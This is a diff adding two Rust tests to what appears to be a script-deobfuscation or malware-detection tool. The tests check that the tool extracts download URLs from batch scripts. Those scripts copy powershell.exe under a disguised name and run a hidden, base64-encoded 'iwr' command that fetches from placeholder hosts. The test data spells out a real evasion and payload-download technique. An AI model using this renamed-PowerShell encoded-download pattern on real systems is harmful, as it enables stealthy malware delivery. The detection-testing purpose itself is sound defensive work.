@@ -11859,6 +11859,57 @@ echo %PAYLOAD% | %RUN%"#,
         let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
         assert_eq!(trimmed, payload);
     }
+
+    #[test]
+    fn copied_powershell_alias_encoded_command_extracts() {
+        let payload = "iwr http://renamed-powershell.example/p.ps1";
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+        let script = format!(
+            "copy /y C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe script.bat.exe\r\nscript.bat.exe -wIn 1 -enC {b64}\r\n"
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == "http://renamed-powershell.example/p.ps1"
+            )),
+            "renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn xcopy_copied_powershell_alias_encoded_command_extracts() {
+        let payload = "iwr https://xcopy-copied-ps.example/stage";
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!(
+            "echo F | xcopy /d /q /y /h /i C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe %temp%\\Ckiczrjbb.png\r\n\
+             %temp%\\Ckiczrjbb.png -win 1 -enc {b64}\r\n",
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == "https://xcopy-copied-ps.example/stage"
+            )),
+            "xcopy renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
